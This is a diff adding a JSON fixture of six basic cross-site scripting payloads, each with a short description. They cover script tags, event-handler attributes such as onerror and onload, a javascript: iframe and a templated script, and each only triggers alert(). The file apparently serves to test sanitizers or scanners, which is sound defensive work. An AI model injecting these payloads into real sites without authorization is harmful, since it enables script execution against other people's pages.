@@ -1,0 +1,38 @@
+[
+    {
+        "id": "xss_script_basic",
+        "type": "xss",
+        "payload": "<script>alert(1)</script>",
+        "description": "Basic reflected XSS using script tag"
+    },
+    {
+        "id": "xss_img_onerror",
+        "type": "xss",
+        "payload": "<img src=x onerror=alert('xss')>",
+        "description": "Image tag with onerror attribute"
+    },
+    {
+        "id": "xss_svg_onload",
+        "type": "xss",
+        "payload": "<svg onload=alert('xss')>",
+        "description": "SVG vector with onload attribute"
+    },
+    {
+        "id": "xss_body_onload",
+        "type": "xss",
+        "payload": "<body onload=alert('xss')>",
+        "description": "Body tag event trigger"
+    },
+    {
+        "id": "xss_iframe_js",
+        "type": "xss",
+        "payload": "<iframe src=\"javascript:alert('xss')\"></iframe>",
+        "description": "Iframe with JavaScript payload"
+    },
+    {
+        "id": "xss_template_script",
+        "type": "xss",
+        "payload": "<template><script>alert(1)</script></template>",
+        "description": "XSS inside HTML template tag"
+    }
+]
